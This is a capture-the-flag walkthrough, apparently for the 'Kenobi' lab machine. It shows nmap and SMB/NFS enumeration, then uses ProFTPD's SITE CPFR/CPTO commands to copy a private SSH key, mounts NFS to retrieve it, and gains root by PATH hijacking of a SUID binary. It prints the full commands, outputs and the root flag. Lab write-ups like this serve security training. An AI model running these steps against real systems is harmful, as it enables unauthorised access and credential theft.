#  Enumerating

## Nmap

```shell
nmap -sC -sV 10.10.213.125
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 11:57 IST
Nmap scan report for 10.10.213.125
Host is up (0.15s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      38496/udp   mountd
|   100005  1,2,3      46313/tcp   mountd
|   100005  1,2,3      59857/udp6  mountd
|   100005  1,2,3      60979/tcp6  mountd
|   100021  1,3,4      35053/udp6  nlockmgr
|   100021  1,3,4      35817/udp   nlockmgr
|   100021  1,3,4      39105/tcp   nlockmgr
|   100021  1,3,4      42097/tcp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h47m18s, deviation: 2h53m12s, median: 7m17s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2022-04-13T06:35:35
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-04-13T01:35:35-05:00

```

## Samba for shares

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and  other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block  (SMB). SMB is developed only for Windows, without Samba, other computer  platforms would be isolated from Windows machines, even if they were  part of the same network.         

Using nmap we can enumerate a machine for SMB shares.

Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!

- **`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.213.125`**

- **`smbclient //<ip>/anonymous`**   *inspect SMB*
-    **`smbget -R smb://<ip>/anonymous`**      *download the SMB share*

SMB has two ports, 445 and 139.

```shell
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.213.125\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.213.125\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.213.125\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>                                                    
```



Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that  converts remote procedure call (RPC) program number into universal  addresses. When an RPC service is started, it tells rpcbind the address  at which it is listening and the RPC program number its prepared to  serve. 

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

**`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.213.125`**

# Gain initial access with ProFtpd

```shell
root@kali:~# nc 10.10.68.87 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.87]
$ SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
$ SITE CPTO /var/tmp/id_rsa
250 Copy successful
```



```shell
root@kali:~# mkdir /mnt/kenobiNFS
root@kali:~# mount 10.10.68.87:/var /mnt/kenobiNFS
root@kali:~# cd /mnt/kenobiNFS/
root@kali:/mnt/kenobiNFS# ls -la
total 56
drwxr-xr-x 14 root root    4096 Sep  4  2019 .
drwxr-xr-x  3 root root    4096 Apr  7 12:00 ..
drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
drwxrwxrwt  6 root root    4096 Apr  7 11:59 tmp
drwxr-xr-x  3 root root    4096 Sep  4  2019 www
root@kali:/mnt/kenobiNFS#
```

```shell

root@kali:~# cp /mnt/kenobiNFS/tmp/id_rsa .
root@kali:~# chmod 600 id_rsa 
root@kali:~# ssh -i id_rsa kenobi@10.10.68.87
The authenticity of host '10.10.68.87 (10.10.68.87)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.68.87' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 		
```

# Privilege Escalation with Path Variable Manipulation                            

![img](https://i.imgur.com/LN2uOCJ.png)

Lets first understand what what SUID, SGID and Sticky Bits are.

| **Permission** | **On Files**                                                 | **On Directories**                                        |
| -------------- | ------------------------------------------------------------ | --------------------------------------------------------- |
| SUID Bit       | User executes the file with permissions of the *file* owner  | -                                                         |
| SGID Bit       | User executes the file with the permission of the *group* owner. | File created in directory gets the same group owner.      |
| Sticky Bit     | No meaning                                                   | Users are prevented from deleting files from other users. |

Answer the questions below                                                          

SUID bits can be dangerous, some  binaries such as passwd need to be run with elevated privileges (as its  resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: **`find / -perm -u=s -type f 2>/dev/null`**

What file looks particularly out of the ordinary? 

```shell
kenobi@kenobi:~$ find / -type f -perm -u=s 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
kenobi@kenobi:~$
```

```shell
kenobi@kenobi:~$ cd /tmp/
kenobi@kenobi:/tmp$ echo /bin/bash > curl 
kenobi@kenobi:/tmp$ chmod +x curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:/tmp# cd /root/
root@kenobi:/root# ls
root.txt
root@kenobi:/root# cat root.txt 
177b3cd8562289f37382721c28381f02
root@kenobi:/root# 
```

